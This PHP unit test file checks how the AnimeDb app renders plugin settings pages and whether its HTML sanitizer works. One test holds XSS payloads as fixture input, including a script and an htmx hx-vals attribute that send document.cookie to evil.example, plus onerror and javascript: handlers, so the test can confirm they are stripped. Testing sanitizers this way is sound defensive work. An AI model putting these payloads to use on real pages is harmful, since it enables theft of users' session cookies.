<?php

/**
 * AnimeDb package.
 *
 * @author    Peter Gribanov <info@peter-gribanov.ru>
 * @copyright Copyright (c) 2026, Peter Gribanov
 * @license   https://www.gnu.org/licenses/gpl-3.0.html GPL-3.0-or-later
 */

/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

declare(strict_types=1);

namespace App\Tests\Unit\Twig;

use App\Service\Plugin\PluginHtmlSanitizer;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Component\HttpFoundation\Session\Storage\MockArraySessionStorage;
use Twig\Environment;

/**
 * Issue #595: this reproduces `animedb-shikimori/templates/settings.html.twig`'s actual markup
 * (the only plugin with a settings page today) through {@see PluginHtmlSanitizer} and then through
 * the real `settings/plugin/page.html.twig` shell, the same two steps
 * {@see \App\Controller\Settings\PluginSettingsController::__invoke()} performs. The plugin's own
 * repository is out of this repo's reach, so this is the host-side half of acceptance criterion
 * #4/#9: the save form's HTMX wiring and every field it needs survive, and the Authorize link
 * stays a plain top-level navigation rather than being stripped or turned into an HTMX swap.
 */
final class PluginSettingsPageRenderingTest extends KernelTestCase
{
    private function pushRequestWithSession(): void
    {
        $request = Request::create('/settings/plugins/animedb-shikimori');
        $request->setSession(new Session(new MockArraySessionStorage()));

        /** @var RequestStack $requestStack */
        $requestStack = self::getContainer()->get('request_stack');
        $requestStack->push($request);
    }

    public function testRealShikimoriSettingsMarkupSurvivesSanitizationAndRendersInsideTheShell(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        $rawPluginMarkup = <<<'HTML'
            <div id="animedb-shikimori-settings">
                <form hx-post="/settings/plugins/animedb-shikimori/save" hx-target="#animedb-shikimori-settings" hx-swap="outerHTML">
                    <input type="hidden" name="_token" value="token-value">
                    <label for="animedb-shikimori-api-endpoint">API endpoint</label>
                    <input type="text" id="animedb-shikimori-api-endpoint" name="api_endpoint" value="https://shikimori.io" placeholder="https://shikimori.io">
                    <button type="submit">Save</button>
                </form>
                <div class="oauth">
                    <h3>Account</h3>
                    <p class="status status-not-authorized">Not authorized</p>
                    <a href="/plugin/animedb-shikimori/oauth/start">Authorize</a>
                </div>
            </div>
            HTML;

        $content = (new PluginHtmlSanitizer())->sanitize($rawPluginMarkup);

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => $content,
            'renderFailed' => false,
        ]);

        // The save form keeps its HTMX wiring and every field the plugin needs.
        $this->assertStringContainsString('hx-post="/settings/plugins/animedb-shikimori/save"', $html);
        $this->assertStringContainsString('hx-target="#animedb-shikimori-settings"', $html);
        $this->assertStringContainsString('hx-swap="outerHTML"', $html);
        $this->assertStringContainsString('name="api_endpoint"', $html);
        $this->assertStringContainsString('value="https://shikimori.io"', $html);
        $this->assertStringContainsString('for="animedb-shikimori-api-endpoint"', $html);
        $this->assertStringContainsString('<button type="submit">Save</button>', $html);

        // The Authorize link stays a plain top-level navigation — no hx-* attribute was added to
        // it, and its href to the plugin's own OAuth start route survived intact.
        $this->assertStringContainsString('<a href="/plugin/animedb-shikimori/oauth/start">Authorize</a>', $html);
    }

    public function testMaliciousPluginMarkupIsStrippedBeforeReachingTheShell(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        $rawPluginMarkup = '<div id="animedb-shikimori-settings">'
            .'<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
            .'<img src="x" onerror="alert(1)">'
            .'<a href="javascript:alert(1)">Authorize</a>'
            .'<div hx-get="/health" hx-trigger="load" '
            .'hx-vals="js:fetch(\'https://evil.example/?c=\'+document.cookie)"></div>'
            .'</div>';

        $content = (new PluginHtmlSanitizer())->sanitize($rawPluginMarkup);

        // Asserted on the sanitized fragment itself, not the full page: base.html.twig's own
        // <script> tags (htmx.min.js and friends) are legitimate host markup, not plugin output,
        // and would make a whole-page "no <script>" assertion pass for the wrong reason.
        $this->assertStringNotContainsString('<script', $content);
        $this->assertStringNotContainsString('evil.example', $content);
        $this->assertStringNotContainsString('onerror', $content);
        $this->assertStringNotContainsString('javascript:', $content);
        // hx-vals's value is evaluated as JavaScript by htmx when it carries a `js:` prefix — the
        // same risk class as onclick=, so the attribute must never reach the rendered page even
        // though it matches the hx-* prefix htmx-driven markup is otherwise allowed to keep.
        $this->assertStringNotContainsString('hx-vals', $content);

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => $content,
            'renderFailed' => false,
        ]);

        $this->assertStringContainsString($content, $html);
        $this->assertStringNotContainsString('evil.example', $html);
        $this->assertStringNotContainsString('onerror', $html);
        $this->assertStringNotContainsString('javascript:', $html);
    }

    /**
     * Issue #871: the shell shows a generic OAuth-port warning when OAUTH_CALLBACK_FIXED_PORT=0
     * (native/supervisor/env.js) is surfaced to it as `oauthCallbackWarning`, without naming any
     * specific plugin or OAuth provider.
     */
    public function testShowsTheOauthFixedPortWarningWhenPassedTrue(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
            'oauthCallbackWarning' => true,
        ]);

        $this->assertStringContainsString('alert-warning', $html);
        $this->assertStringNotContainsString('Shikimori', $this->extractWarningText($html));
        $this->assertStringNotContainsString('MyAnimeList', $html);
    }

    public function testDoesNotShowTheOauthFixedPortWarningWhenPassedFalse(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
            'oauthCallbackWarning' => false,
        ]);

        $this->assertStringNotContainsString('alert-warning', $html);
    }

    /**
     * Issue #871: a template that omits `oauthCallbackWarning` entirely (strict_variables is on,
     * see config/packages/twig.yaml) must not throw — this is the shape every caller used before
     * this field existed, and still the shape of this test file's two tests above this section.
     */
    public function testDoesNotShowTheOauthFixedPortWarningWhenTheVariableIsAbsent(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
        ]);

        $this->assertStringNotContainsString('alert-warning', $html);
    }

    /**
     * Issue #865: the connect-seed notice replaces the old redirect to the sync review page — it
     * must render above the plugin's own markup and link to that same route.
     */
    public function testShowsTheSyncSeedNoticeWithALinkToTheSyncReviewPageWhenSyncReviewUrlIsSet(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
            'syncReviewUrl' => '/settings/sync-review',
        ]);

        $this->assertStringContainsString('alert-info', $html);
        $this->assertStringContainsString('<a href="/settings/sync-review">', $html);
        $this->assertStringContainsString('Go to Requires attention', $html);
        $this->assertStringContainsString('<form>settings</form>', $html);
    }

    public function testDoesNotShowTheSyncSeedNoticeWhenSyncReviewUrlIsNull(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
            'syncReviewUrl' => null,
        ]);

        // The settings sidebar always links to /settings/sync-review (it's one of the sidebar's
        // permanent nav items, see SettingsNavigationService), so the notice itself — not that
        // substring — is what must be absent here.
        $this->assertStringNotContainsString('alert-info', $html);
        $this->assertStringNotContainsString('Go to Requires attention', $html);
    }

    /**
     * Issue #871's precedent again (`strict_variables` is on, see config/packages/twig.yaml): a
     * caller that predates `syncReviewUrl` and omits it entirely must not throw.
     */
    public function testDoesNotShowTheSyncSeedNoticeWhenTheVariableIsAbsent(): void
    {
        self::bootKernel();
        $this->pushRequestWithSession();

        /** @var Environment $twig */
        $twig = self::getContainer()->get('twig');
        $html = $twig->render('settings/plugin/page.html.twig', [
            'pluginId' => 'animedb-shikimori',
            'pluginName' => 'Shikimori',
            'pluginUi' => ['css' => [], 'js' => []],
            'content' => '<form>settings</form>',
            'renderFailed' => false,
        ]);

        $this->assertStringNotContainsString('alert-info', $html);
    }

    private function extractWarningText(string $html): string
    {
        \preg_match('/<p class="alert alert-warning">(.*?)<\/p>/s', $html, $matches);

        return $matches[1] ?? '';
    }
}
